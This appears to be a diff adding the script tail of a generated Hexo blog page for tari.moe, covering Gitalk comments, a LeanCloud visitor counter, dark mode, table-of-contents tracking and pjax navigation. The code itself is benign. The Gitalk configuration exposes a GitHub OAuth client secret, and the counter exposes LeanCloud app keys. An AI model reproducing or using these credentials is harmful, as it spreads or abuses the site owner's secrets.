+	hoverDelay: 25
+  };
+</script>
+<script defer src="https://cdn.jsdelivr.net/gh/gijo-varghese/flying-pages@2.1.2/flying-pages.min.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+  <script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script type="text/javascript">
+  function pjax_gitalk() {
+    if(!document.querySelectorAll("#gitalk-container")[0])return;
+    let path = pdata.commentPath;
+    if (path.length == 0) {
+      let defaultPath = '';
+      path = defaultPath || decodeURI(window.location.pathname);
+    }
+    if (document.getElementById('gitalk-container') != null) {
+      var gitalk = new Gitalk(Object.assign({"clientID":"71041770cc5d77158add","clientSecret":"e6825eb932dd754c2690903ffea01232bf0fc87f","repo":"tari0510.github.io","owner":"TARI0510","admin":["TARI0510"],"path":null}, {
+	  id: path,
+	  distractionFreeMode: false  // Facebook-like distraction free mode
+    }));
+      gitalk.render('gitalk-container');
+    }
+  }
+  $(function () {
+    pjax_gitalk();
+  });
+  volantis.pjax.push(pjax_gitalk);
+</script>
+
+
+
+
+
+
+  
+<script src="https://cdn.jsdelivr.net/npm/hexo-theme-volantis@4.3.1/source/js/app.min.js"></script>
+
+
+
+<!-- optional -->
+
+  <script>
+const SearchServiceimagePath="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@master/img/";
+const ROOT =  ("/" || "/").endsWith('/') ? ("/" || "/") : ("//" || "/" );
+
+$('.input.u-search-input').one('focus',function(){
+	
+		loadScript('https://cdn.jsdelivr.net/npm/hexo-theme-volantis@4.3.1/source/js/search/hexo.min.js',setSearchService);
+	
+})
+
+function listenSearch(){
+  
+    customSearch = new HexoSearch({
+      imagePath: SearchServiceimagePath
+    });
+  
+}
+function setSearchService() {
+	listenSearch();
+	
+}
+</script>
+
+
+
+
+
+
+
+
+
+
+
+  <script defer>
+
+  const LCCounter = {
+    app_id: 'drHoUTNkw1UylDdn7MwkAry5-MdYXbMMI',
+    app_key: 'JgkgW3M15DEOEujk1nYGmmIx',
+    custom_api_server: '',
+
+    // 查询存储的记录
+    getRecord(Counter, url, title) {
+      return new Promise(function (resolve, reject) {
+        Counter('get', '/classes/Counter?where=' + encodeURIComponent(JSON.stringify({url})))
+          .then(resp => resp.json())
+          .then(({results, code, error}) => {
+            if (code === 401) {
+              throw error;
+            }
+            if (results && results.length > 0) {
+              var record = results[0];
+              resolve(record);
+            } else {
+              Counter('post', '/classes/Counter', {url, title: title, times: 0})
+                .then(resp => resp.json())
+                .then((record, error) => {
+                  if (error) {
+                    throw error;
+                  }
+                  resolve(record);
+                }).catch(error => {
+                console.error('Failed to create', error);
+                reject(error);
+              });
+            }
+          }).catch((error) => {
+          console.error('LeanCloud Counter Error:', error);
+          reject(error);
+        });
+      })
+    },
+
+    // 发起自增请求
+    increment(Counter, incrArr) {
+      return new Promise(function (resolve, reject) {
+        Counter('post', '/batch', {
+          "requests": incrArr
+        }).then((res) => {
+          res = res.json();
+          if (res.error) {
+            throw res.error;
+          }
+          resolve(res);
+        }).catch((error) => {
+          console.error('Failed to save visitor count', error);
+          reject(error);
+        });
+      });
+    },
+
+    // 构建自增请求体
+    buildIncrement(objectId) {
+      return {
+        "method": "PUT",
+        "path": `/1.1/classes/Counter/${ objectId }`,
+        "body": {
+          "times": {
+            '__op': 'Increment',
+            'amount': 1
+          }
+        }
+      }
+    },
+
+    // 校验是否为有效的 UV
+    validUV() {
+      var key = 'LeanCloudUVTimestamp';
+      var flag = localStorage.getItem(key);
+      if (flag) {
+        // 距离标记小于 24 小时则不计为 UV
+        if (new Date().getTime() - parseInt(flag) <= 86400000) {
+          return false;
+        }
+      }
+      localStorage.setItem(key, new Date().getTime().toString());
+      return true;
+    },
+
+    addCount(Counter) {
+      var enableIncr = '' === 'true' && window.location.hostname !== 'localhost';
+      enableIncr = true;
+      var getterArr = [];
+      var incrArr = [];
+      // 请求 PV 并自增
+      var pvCtn = document.querySelector('#lc-sv');
+      if (pvCtn || enableIncr) {
+        var pvGetter = this.getRecord(Counter, 'https://tari.moe' + '/#lc-sv', 'Visits').then((record) => {
+          incrArr.push(this.buildIncrement(record.objectId))
+          var eles = document.querySelectorAll('#lc-sv #number');
+          if (eles.length > 0) {
+            eles.forEach((el,index,array)=>{
+              el.innerText = record.times + 1;
+              if (pvCtn) {
+                pvCtn.style.display = 'inline';
+              }
+            })
+          }
+        });
+        getterArr.push(pvGetter);
+      }
+
+      // 请求 UV 并自增
+      var uvCtn = document.querySelector('#lc-uv');
+      if (uvCtn || enableIncr) {
+        var uvGetter = this.getRecord(Counter, 'https://tari.moe' + '/#lc-uv', 'Visitors').then((record) => {
+          var vuv = this.validUV();
+          vuv && incrArr.push(this.buildIncrement(record.objectId))
+          var eles = document.querySelectorAll('#lc-uv #number');
+          if (eles.length > 0) {
+            eles.forEach((el,index,array)=>{
+              el.innerText = record.times + (vuv ? 1 : 0);
+              if (uvCtn) {
+                uvCtn.style.display = 'inline';
+              }
+            })
+          }
+        });
+        getterArr.push(uvGetter);
+      }
+
+      // 请求文章的浏览数，如果是当前页面就自增
+      var allPV = document.querySelectorAll('#lc-pv');
+      if (allPV.length > 0 || enableIncr) {
+        for (i = 0; i < allPV.length; i++) {
+          let pv = allPV[i];
+          let title = pv.getAttribute('data-title');
+          var url = 'https://tari.moe' + pv.getAttribute('data-path');
+          if (url) {
+            var viewGetter = this.getRecord(Counter, url, title).then((record) => {
+              // 是当前页面就自增
+              let curPath = window.location.pathname;
+              if (curPath.includes('index.html')) {
+                curPath = curPath.substring(0, curPath.lastIndexOf('index.html'));
+              }
+              if (pv.getAttribute('data-path') == curPath) {
+                incrArr.push(this.buildIncrement(record.objectId));
+              }
+              if (pv) {
+                var ele = pv.querySelector('#lc-pv #number');
+                if (ele) {
+                  if (pv.getAttribute('data-path') == curPath) {
+                    ele.innerText = (record.times || 0) + 1;
+                  } else {
+                    ele.innerText = record.times || 0;
+                  }
+                  pv.style.display = 'inline';
+                }
+              }
+            });
+            getterArr.push(viewGetter);
+          }
+        }
+      }
+
+      // 如果启动计数自增，批量发起自增请求
+      if (enableIncr) {
+        Promise.all(getterArr).then(() => {
+          incrArr.length > 0 && this.increment(Counter, incrArr);
+        })
+      }
+
+    },
+
+
+    fetchData(api_server) {
+      var Counter = (method, url, data) => {
+        return fetch(`${ api_server }/1.1${ url }`, {
+          method,
+          headers: {
+            'X-LC-Id': this.app_id,
+            'X-LC-Key': this.app_key,
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(data)
+        });
+      };
+      this.addCount(Counter);
+    },
+
+    refreshCounter() {
+      var api_server = this.app_id.slice(-9) !== '-MdYXbMMI' ? this.custom_api_server : `https://${ this.app_id.slice(0, 8).toLowerCase() }.api.lncldglobal.com`;
+      if (api_server) {
+        this.fetchData(api_server);
+      } else {
+        fetch('https://app-router.leancloud.cn/2/route?appId=' + this.app_id)
+          .then(resp => resp.json())
+          .then(({api_server}) => {
+            this.fetchData('https://' + api_server);
+          });
+      }
+    }
+
+  };
+
+  LCCounter.refreshCounter();
+
+  document.addEventListener('pjax:complete', function () {
+    LCCounter.refreshCounter();
+  });
+</script>
+
+
+
+
+  <script>
+const rootElement = document.documentElement;
+const darkModeStorageKey = "user-color-scheme";
+const rootElementDarkModeAttributeName = "data-user-color-scheme";
+
+const setLS = (k, v) => {
+    localStorage.setItem(k, v);
+};
+
+const removeLS = (k) => {
+    localStorage.removeItem(k);
+};
+
+const getLS = (k) => {
+    return localStorage.getItem(k);
+};
+
+const getModeFromCSSMediaQuery = () => {
+  return window.matchMedia("(prefers-color-scheme: dark)").matches
+    ? "dark"
+    : "light";
+};
+
+const resetRootDarkModeAttributeAndLS = () => {
+  rootElement.removeAttribute(rootElementDarkModeAttributeName);
+  removeLS(darkModeStorageKey);
+};
+
+const validColorModeKeys = {
+  dark: true,
+  light: true,
+};
+
+const applyCustomDarkModeSettings = (mode) => {
+  const currentSetting = mode || getLS(darkModeStorageKey);
+
+  if (currentSetting === getModeFromCSSMediaQuery()) {
+    resetRootDarkModeAttributeAndLS();
+  } else if (validColorModeKeys[currentSetting]) {
+    rootElement.setAttribute(rootElementDarkModeAttributeName, currentSetting);
+  } else {
+    resetRootDarkModeAttributeAndLS();
+  }
+};
+
+const invertDarkModeObj = {
+  dark: "light",
+  light: "dark",
+};
+
+/**
+ * get target mode
+ */
+const toggleCustomDarkMode = () => {
+  let currentSetting = getLS(darkModeStorageKey);
+
+  if (validColorModeKeys[currentSetting]) {
+    currentSetting = invertDarkModeObj[currentSetting];
+  } else if (currentSetting === null) {
+    currentSetting = invertDarkModeObj[getModeFromCSSMediaQuery()];
+  } else {
+    return;
+  }
+  setLS(darkModeStorageKey, currentSetting);
+  return currentSetting;
+};
+
+/**
+ * bind click event for toggle button
+ */
+var btn=$("#wrapper .toggle-mode-btn,#rightmenu-wrapper .toggle-mode-btn");
+function bindToggleButton() {
+    btn.on('click',(e) => {
+      const mode = toggleCustomDarkMode();
+      applyCustomDarkModeSettings(mode);
+    });
+}
+
+applyCustomDarkModeSettings();
+document.addEventListener("DOMContentLoaded", bindToggleButton);
+volantis.pjax.push(bindToggleButton);
+volantis.pjax.send(()=>{
+	btn.unbind('click');
+},'toggle-mode-btn-unbind');
+</script>
+
+
+
+
+
+
+
+
+<script>
+function listennSidebarTOC() {
+  const navItems = document.querySelectorAll(".toc li");
+  if (!navItems.length) return;
+  const sections = [...navItems].map((element) => {
+    const link = element.querySelector(".toc-link");
+    const target = document.getElementById(
+      decodeURI(link.getAttribute("href")).replace("#", "")
+    );
+    link.addEventListener("click", (event) => {
+      event.preventDefault();
+      window.scrollTo({
+		top: target.offsetTop + 100,
+		
+		behavior: "smooth"
+		
+	  });
+    });
+    return target;
+  });
+
+  function activateNavByIndex(target) {
+    if (target.classList.contains("active-current")) return;
+
+    document.querySelectorAll(".toc .active").forEach((element) => {
+      element.classList.remove("active", "active-current");
+    });
+    target.classList.add("active", "active-current");
+    let parent = target.parentNode;
+    while (!parent.matches(".toc")) {
+      if (parent.matches("li")) parent.classList.add("active");
+      parent = parent.parentNode;
+    }
+  }
+
+  function findIndex(entries) {
+    let index = 0;
+    let entry = entries[index];
+    if (entry.boundingClientRect.top > 0) {
+      index = sections.indexOf(entry.target);
+      return index === 0 ? 0 : index - 1;
+    }
+    for (; index < entries.length; index++) {
+      if (entries[index].boundingClientRect.top <= 0) {
+        entry = entries[index];
+      } else {
+        return sections.indexOf(entry.target);
+      }
+    }
+    return sections.indexOf(entry.target);
+  }
+
+  function createIntersectionObserver(marginTop) {
+    marginTop = Math.floor(marginTop + 10000);
+    let intersectionObserver = new IntersectionObserver(
+      (entries, observe) => {
+        let scrollHeight = document.documentElement.scrollHeight + 100;
+        if (scrollHeight > marginTop) {
+          observe.disconnect();
+          createIntersectionObserver(scrollHeight);
+          return;
+        }
+        let index = findIndex(entries);
+        activateNavByIndex(navItems[index]);
+      },
+      {
+        rootMargin: marginTop + "px 0px -100% 0px",
+        threshold: 0,
+      }
+    );
+    sections.forEach((element) => {
+      element && intersectionObserver.observe(element);
+    });
+  }
+  createIntersectionObserver(document.documentElement.scrollHeight);
+}
+
+document.addEventListener("DOMContentLoaded", listennSidebarTOC);
+document.addEventListener("pjax:success", listennSidebarTOC);
+</script>
+
+<!-- more -->
+
+ 
+	   
+	    
+
+
+<script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script>
+
+
+<script>
+    var pjax;
+    document.addEventListener('DOMContentLoaded', function () {
+      pjax = new Pjax({
+        elements: 'a[href]:not([href^="#"]):not([href="javascript:void(0)"]):not([pjax-fancybox])',
+        selectors: [
+          "title",
+          
+          "#pjax-container",
+          "#pjax-header-nav-list"
+        ],
+        cacheBust: false,   // url 地址追加时间戳，用以避免浏览器缓存
+        timeout: 5000
+      });
+    });
+
+    document.addEventListener('pjax:send', function (e) {
+      //window.stop(); // 相当于点击了浏览器的停止按钮
+
+      try {
+        var currentUrl = window.location.pathname;
+        var targetUrl = e.triggerElement.href;
+        var banUrl = [""];
+        if (banUrl[0] != "") {
+          banUrl.forEach(item => {
+            if(currentUrl.indexOf(item) != -1 || targetUrl.indexOf(item) != -1) {
+              window.location.href = targetUrl;
+            }
+          });
+        }
+      } catch (error) {}
+
+      window.subData = null; // 移除标题（用于一二级导航栏切换处）
+
+      volantis.$switcher.removeClass('active'); // 关闭移动端激活的搜索框
+      volantis.$header.removeClass('z_search-open'); // 关闭移动端激活的搜索框
+      volantis.$wrapper.removeClass('sub'); // 跳转页面时关闭二级导航
+
+      // 解绑事件 避免重复监听
+      volantis.$topBtn.unbind('click');
+      $('.menu a').unbind('click');
+      $(window).unbind('resize');
+      $(window).unbind('scroll');
+      $(document).unbind('scroll');
+      $(document).unbind('click');
+      $('body').unbind('click');
+	  // 使用 volantis.pjax.send 方法传入pjax:send回调函数 参见layout/_partial/scripts/global.ejs
+	  volantis.pjax.method.send.start();
+    });
+
+    document.addEventListener('pjax:complete', function () {
+      $('.nav-main').find('.list-v').not('.menu-phone').removeAttr("style",""); // 移除小尾巴的移除
+      $('.menu-phone.list-v').removeAttr("style",""); // 移除小尾巴的移除
+      $('script[data-pjax], .pjax-reload script').each(function () {
+        $(this).parent().append($(this).remove());
+      });
+      try{
+		// 使用 volantis.pjax.push 方法传入重载函数 参见layout/_partial/scripts/global.ejs
+		volantis.pjax.method.complete.start();
+      } catch (e) {
+        console.log(e);
+      }
+    });
+
+    document.addEventListener('pjax:error', function (e) {
+	  // 使用 volantis.pjax.error 方法传入pjax:error回调函数 参见layout/_partial/scripts/global.ejs
+	  volantis.pjax.method.error.start();
+      window.location.href = e.triggerElement.href;
+    });
+</script>
+ 
+	  
+    </div>
+  <script async>window.onload=function(){var a=document.createElement('script'),b=document.getElementsByTagName('script')[0];a.type='text/javascript',a.async=!0,a.src='/sw-register.js?v='+Date.now(),b.parentNode.insertBefore(a,b)};</script></body></html>
